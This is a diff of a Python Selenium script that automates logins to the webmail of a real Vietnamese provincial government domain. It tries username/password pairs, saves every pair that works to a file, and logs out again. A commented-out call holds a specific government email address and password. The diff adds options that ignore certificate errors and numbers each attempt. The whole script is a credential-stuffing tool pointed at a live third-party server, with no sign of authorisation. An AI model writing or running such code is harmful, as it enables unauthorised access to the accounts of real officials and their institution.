@@ -4,14 +4,20 @@ from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchElementException
 import time
 # Set the path to the ChromeDriver executable
-chromedriver_path = './chromedriver'
+chromedriver_path = './chromedriver.exe'
 
 # Create a new instance of the Chrome driver
-driver = webdriver.Chrome(executable_path=chromedriver_path)
-
+options = webdriver.ChromeOptions()
+options.add_argument('--ignore-certificate-errors')
+#options.add_argument('--no-sandbox')
+options.add_argument("disable-infobars")
+options.add_argument('--disable-browser-side-navigation')
+options.add_argument("--start-maximized")
+driver = webdriver.Chrome(options=options)
+# driver.set_page_load_timeout(20)
 # Open the login page
 driver.get('https://mail.hatinh.gov.vn/')
-def login(username, password):
+def login(username, password, index):
     username_field = driver.find_element(By.ID,'username')
     username_field.send_keys(username)
     time.sleep(1)
@@ -22,16 +28,16 @@ def login(username, password):
     time.sleep(1)
     try:
         z_username = driver.find_element(By.ID, 'z_userName')
-        append_new_line('correct.txt', f'{username}|{password}')
+        append_new_line('correct.txt', f'{index}.{username}|{password}')
         # time.sleep(1)
         element = driver.find_element(By.CLASS_NAME, 'DwtLinkButtonDropDownArrowTd')
         element.click()
         time.sleep(1)
         element_log_out = driver.find_element(By.ID,"logOff_title")
         element_log_out.click()
-        print(f'---------{username} - {password} ok -------------')
+        print(f'{index}. ---------{username} - {password} ok -------------')
     except NoSuchElementException:
-        print(f'{username} - {password} wrong')
+        print(f'{index}. {username} - {password} wrong')
 def append_new_line(file_name, text_to_append):
     """Append given text as a new line at the end of file"""
     # Open the file in append & read mode ('a+')
@@ -45,5 +51,5 @@ def append_new_line(file_name, text_to_append):
         # Append text at the end of file
         file_object.write(text_to_append)
         file_object.close()
-# login('sonb.tt@hatinh.gov.vn', 'Abc@12345')
+# login('sonb.tt@hatinh.gov.vn', 'Abc@12345',2)
 
